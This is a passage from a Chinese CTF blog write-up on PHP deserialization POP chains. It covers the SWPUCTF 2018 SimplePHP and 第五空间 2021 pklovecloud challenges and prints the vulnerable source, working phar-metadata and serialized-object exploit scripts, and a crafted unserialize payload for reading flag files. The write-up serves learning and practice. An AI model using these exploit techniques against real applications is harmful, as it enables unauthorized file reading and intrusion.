+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($key,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#x27;hacker!&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker~&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>这次多了几个waf，不过我们依然要先定位出入口。出口很好定位，Test类的file_get()，存在base64_encode(file_get_contents($value))，可以读取文件。那么为了触发这个函数，我们定位到同类下的__get()，利用其到get()来触发。</p>
+<p>那么我们发现Show类的__toString()中可以把$content的内容返回对象，而若$show-&gt;str[‘str’]为test类的一个实例化对象，则因test类里面没有source属性，从而触发__get()方法。</p>
+<p>最后定位到Cle4r类，__destruct()方法可以把$test也就是$str给输出出来。将$str声明为$show对象可以触发show类中的__toString()方法。</p>
+<p>链条构造完成，编写exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c1e4r = new C1e4r();</span><br><span class="line">$show = new Show();</span><br><span class="line">$test = new Test();</span><br><span class="line">$test-&gt;params[&#x27;source&#x27;] = &quot;/var/www/html/f1ag.php&quot;;</span><br><span class="line">$c1e4r-&gt;str = $show; </span><br><span class="line">$show-&gt;str[&#x27;str&#x27;] = $test; </span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;); </span><br><span class="line">$phar-&gt;setMetadata($c1e4r); </span><br><span class="line">$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); </span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传后在/upload目录下获取文件名，最后在查看文件的目录下用phar://伪协议读取flag。</p>
+<h1 id="第五空间-2021-pklovecloud"><a href="#第五空间-2021-pklovecloud" class="headerlink" title="[第五空间 2021]pklovecloud"></a>[第五空间 2021]pklovecloud</h1><p>审计源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">class pkshow </span><br><span class="line">&#123;  </span><br><span class="line">    function echo_name()     </span><br><span class="line">    &#123;          </span><br><span class="line">        return &quot;Pk very safe^.^&quot;;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class acp </span><br><span class="line">&#123;   </span><br><span class="line">    protected $cinder;  </span><br><span class="line">    public $neutron;</span><br><span class="line">    public $nova;</span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;      </span><br><span class="line">        $this-&gt;cinder = new pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        if (isset($this-&gt;cinder))  </span><br><span class="line">            return $this-&gt;cinder-&gt;echo_name();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">class ace</span><br><span class="line">&#123;    </span><br><span class="line">    public $filename;     </span><br><span class="line">    public $openstack;</span><br><span class="line">    public $docker; </span><br><span class="line">    function echo_name()      </span><br><span class="line">    &#123;   </span><br><span class="line">        $this-&gt;openstack = unserialize($this-&gt;docker);</span><br><span class="line">        $this-&gt;openstack-&gt;neutron = $heat;</span><br><span class="line">        if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;</span><br><span class="line">            if (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                return file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            else </span><br><span class="line">            &#123; </span><br><span class="line">                return &quot;keystone lost~&quot;; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;pks&#x27;]))  </span><br><span class="line">&#123;</span><br><span class="line">    $logData = unserialize($_GET[&#x27;pks&#x27;]);</span><br><span class="line">    echo $logData; </span><br><span class="line">&#125; </span><br><span class="line">else </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(__file__); </span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>前面两题做的真的头大，返回来看题简单的。首先pkshow类一看就没用，因此这个pop只用到了两个类。出口显然是ace类的echo_name()，为了触发这个函数，我们发现acp类中的__toString()调用了这个函数，因此我们要想办法调用。acp实例化时会自动调用__construct()，所以要想触发__toString()就要使$this-&gt;cinder=对象，正好与上述分析所需的 $this-&gt;cinder = new ace() 相呼应。</p>
+<p>因此链条梳理完成，但是我们要注意到在echo_name()中有这样几行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;openstack = unserialize($this-&gt;docker);</span><br><span class="line">$this-&gt;openstack-&gt;neutron = $heat;</span><br><span class="line">if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)</span><br></pre></td></tr></table></figure>
+
+<p>这里有个非预期，直接空等于空就可以绕过了，exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class acp </span><br><span class="line">&#123;   </span><br><span class="line">    protected $cinder;  </span><br><span class="line">    public $neutron;</span><br><span class="line">    public $nova;</span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;      </span><br><span class="line">        $this-&gt;cinder = new ace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">class ace</span><br><span class="line">&#123;    </span><br><span class="line">    public $filename=&quot;flag.php&quot;;     </span><br><span class="line">    public $openstack;</span><br><span class="line">    public $docker=&#x27;&#x27;;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$a=new acp();</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+
+<p>那么预期解是怎样的呢，官方wp中将原来为空的docker的值改为<code>O:8:&quot;stdClass&quot;:2:&#123;s:7:&quot;neutron&quot;;s:1:&quot;a&quot;;s:4:&quot;nova&quot;;R:2;&#125;</code>即可。</p>
+<p>这个反序列化，尤其是这个R真把我搞迷糊了，这个的原理可以参考下面这篇文章，做出了一定的解释：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45927266/article/details/120380343">2021第五空间CTF pklovecloud</a></p>
+<p>不过经过测试发现，其实直接令neutron和nova的值相等就可以了，好像是由于$cinder变量的属性是protected，导致其实<code>$this-&gt;openstack-&gt;neutron = $heat;</code>这句话可以被覆盖，具体原理可能得等之后再探究了。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-php/" rel="tag"># -web -php</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/04/04/php%E8%BF%AD%E4%BB%A3%E5%99%A8%EF%BC%88%E5%8E%9F%E7%94%9F%E7%B1%BB%EF%BC%89%E7%9A%84%E5%88%A9%E7%94%A8/" rel="next" title="php迭代器（原生类）的利用">
+                <i class="fa fa-chevron-left"></i> php迭代器（原生类）的利用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">62</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-pop"><span class="nav-number"></span> <span class="nav-text">[SWPUCTF 2021 新生赛]pop</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox"><span class="nav-number"></span> <span class="nav-text">[CISCN2019 华北赛区 Day1 Web1]Dropbox</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SWPUCTF-2018-SimplePHP"><span class="nav-number"></span> <span class="nav-text">[SWPUCTF 2018]SimplePHP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-pklovecloud"><span class="nav-number"></span> <span class="nav-text">[第五空间 2021]pklovecloud</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
